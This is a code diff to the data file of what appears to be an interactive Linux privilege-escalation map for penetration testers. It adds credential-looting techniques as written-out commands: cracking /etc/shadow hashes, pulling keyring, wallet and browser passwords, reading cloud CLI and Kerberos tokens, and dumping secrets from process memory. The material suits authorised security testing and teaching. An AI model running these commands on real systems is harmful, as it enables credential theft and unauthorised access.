@@ -283,8 +283,8 @@ window.PRIVMAP_DATA = {
       ]
     },
     {
-      id: "creds", title: "Credential Reuse & Looting", color: "#a78bfa", tag: "loot",
-      desc: "The quiet path: a password or key for a higher-privileged account, reused from a file, history, or another host.",
+      id: "creds", title: "Credential Access & Looting", color: "#a78bfa", tag: "loot",
+      desc: "Extract and reuse secrets for a higher-privileged account or another host — from files and history, the shadow file, keyrings/wallets and browsers, cloud/Kerberos tokens, or process memory.",
       techniques: [
         { id: "keys", title: "SSH keys, history & config files",
           theory: { label: "Linux Credential Access & Looting", url: "theory/2026-10-15-linux-credential-access-and-looting.html" },
@@ -297,7 +297,44 @@ window.PRIVMAP_DATA = {
           desc: "Spray a recovered password against local accounts (su) and the root account, and reuse keys across hosts — password reuse is rampant.",
           cmds: ["for u in root $(cut -d: -f1 /etc/passwd); do echo \"$u\"; done   # candidate users", "su - <user>    # try the recovered password", "ssh -i found_key <user>@<next-host>"],
           outcomes: [{ label: "root / lateral", color: "#4ade80" }],
-          moveTo: [{ section: "root", note: "reuse creds to become root" }] }
+          moveTo: [{ section: "root", note: "reuse creds to become root" }] },
+        { id: "shadow", title: "/etc/shadow — crack the hashes",
+          theory: { label: "Linux Credential Access & Looting", url: "theory/2026-10-15-linux-credential-access-and-looting.html" },
+          desc: "Once you can read /etc/shadow (root, the shadow group, raw disk access, or a world-readable backup under /var/backups), combine it with /etc/passwd and crack offline — reused passwords often unlock root and other hosts.",
+          cmds: ["cat /etc/shadow ; ls -l /var/backups/shadow* 2>/dev/null", "unshadow /etc/passwd /etc/shadow > hashes", "john --wordlist=rockyou.txt hashes   # auto-detects the scheme"],
+          outcomes: [{ label: "cracked password", color: "#f59e0b" }, { label: "no read access", color: "#64748b" }],
+          branches: [
+            { label: "$6$ — sha512crypt (older default)", note: "A $6$ prefix is sha512crypt: hashcat mode 1800, or john --format=sha512crypt. Fast enough to run large wordlists against.", cmds: ["hashcat -m 1800 hashes rockyou.txt"], outcomes: [{ label: "cracked", color: "#f59e0b" }] },
+            { label: "$y$ — yescrypt (modern default)", note: "Debian 11+/Ubuntu 22.04+ default to yescrypt ($y$). hashcat has no reliable yescrypt mode — use John the Ripper, which auto-detects it. yescrypt is deliberately slow, so lean on targeted wordlists and rules.", cmds: ["john --wordlist=rockyou.txt --rules hashes"], outcomes: [{ label: "cracked", color: "#f59e0b" }] }
+          ],
+          moveTo: [{ section: "sudo", note: "su to the cracked account, re-check sudo -l" }, { section: "root", note: "the cracked account may be root" }] },
+        { id: "keyring", title: "Keyrings, wallets & browser creds",
+          theory: { label: "Linux Credential Access & Looting", url: "theory/2026-10-15-linux-credential-access-and-looting.html" },
+          desc: "Desktop and jump-host users leave plaintext-recoverable secrets in the GNOME keyring, KDE wallet, and browser credential stores — high value on workstations and bastions.",
+          cmds: ["ls -la ~/.local/share/keyrings/ ~/.local/share/kwalletd/ 2>/dev/null", "ls ~/.mozilla/firefox/*/logins.json ~/.config/google-chrome/Default/'Login Data' 2>/dev/null"],
+          outcomes: [{ label: "plaintext creds", color: "#f59e0b" }],
+          branches: [
+            { label: "GNOME Keyring", note: "login.keyring is unlocked with the user's login password. In an unlocked desktop session, read secrets over the Secret Service (secret-tool / python-secretstorage); otherwise exfil login.keyring and crack it offline.", cmds: ["ls -la ~/.local/share/keyrings/", "secret-tool lookup <attr> <value>   # unlocked session", "# else: copy login.keyring and crack offline"], outcomes: [{ label: "secrets", color: "#f59e0b" }] },
+            { label: "KDE Wallet", note: "kdewallet.kwl in ~/.local/share/kwalletd/ — convert with kwallet2john (John jumbo) and crack, or dump a running unlocked wallet.", cmds: ["kwallet2john ~/.local/share/kwalletd/kdewallet.kwl > h ; john h"], outcomes: [{ label: "secrets", color: "#f59e0b" }] },
+            { label: "Firefox / Chrome", note: "Firefox: key4.db + logins.json decrypt with firefox_decrypt. Chrome on Linux encrypts 'Login Data' with a key in the keyring (historically the fixed password 'peanuts').", cmds: ["python3 firefox_decrypt.py ~/.mozilla/firefox/<profile>"], outcomes: [{ label: "saved logins", color: "#f59e0b" }] }
+          ],
+          moveTo: [{ section: "sudo", note: "re-check sudo -l as the recovered account" }, { section: "root", note: "a recovered password may be root's" }] },
+        { id: "tokens", title: "Cloud CLI & Kerberos tokens",
+          theory: { label: "Linux Credential Access & Looting", url: "theory/2026-10-15-linux-credential-access-and-looting.html" },
+          desc: "Dotfiles and ticket caches hold long-lived cloud keys and live Kerberos tickets — on DevOps boxes and domain-joined (SSSD) hosts these pivot straight into the cloud or the AD domain.",
+          cmds: ["cat ~/.aws/credentials ~/.netrc ~/.git-credentials 2>/dev/null", "cat ~/.kube/config ~/.docker/config.json 2>/dev/null ; ls ~/.config/gcloud ~/.azure 2>/dev/null"],
+          outcomes: [{ label: "cloud / API keys", color: "#f59e0b" }, { label: "Kerberos TGT", color: "#f59e0b" }],
+          branches: [
+            { label: "Cloud CLI credentials", note: "~/.aws/credentials, ~/.config/gcloud, ~/.azure, ~/.kube/config, ~/.docker/config.json, ~/.netrc, ~/.git-credentials — reuse with the matching CLI, then pivot (see the Cloud map).", cmds: ["aws sts get-caller-identity", "kubectl auth can-i --list"], outcomes: [{ label: "cloud access", color: "#4ade80" }] },
+            { label: "Kerberos ccache & keytab", note: "On SSSD-joined hosts /tmp/krb5cc_* and $KRB5CCNAME hold live TGTs; /etc/krb5.keytab holds service keys. Reuse the ccache with Impacket, or extract keys with KeyTabExtract.", cmds: ["klist ; ls -l /tmp/krb5cc_* /etc/krb5.keytab", "export KRB5CCNAME=/tmp/krb5cc_<uid> ; klist", "python3 keytabextract.py /etc/krb5.keytab"], outcomes: [{ label: "domain creds", color: "#4ade80" }] }
+          ],
+          moveTo: [{ section: "sudo", note: "reuse tokens locally, re-check sudo -l" }, { section: "root", note: "a reused identity may be privileged" }] },
+        { id: "memory", title: "Secrets in process memory",
+          theory: { label: "Linux Credential Access & Looting", url: "theory/2026-10-15-linux-credential-access-and-looting.html" },
+          desc: "Running display managers, SSH, sudo, and service agents keep passwords in RAM; with root or ptrace rights you can read them straight out of process memory, environment, and swap.",
+          cmds: ["sudo python3 mimipenguin.py        # GDM/LightDM/SSH/sudo creds from memory", "cat /proc/<pid>/environ | tr '\\0' '\\n' | grep -iE 'pass|token|key'", "gcore <pid> ; strings core.<pid> | grep -iE 'password|secret'"],
+          outcomes: [{ label: "plaintext creds", color: "#f59e0b" }, { label: "needs root / ptrace", color: "#64748b" }],
+          moveTo: [{ section: "sudo", note: "re-check sudo -l with the recovered password" }, { section: "root", note: "a dumped password may be root's" }] }
       ]
     },
     {
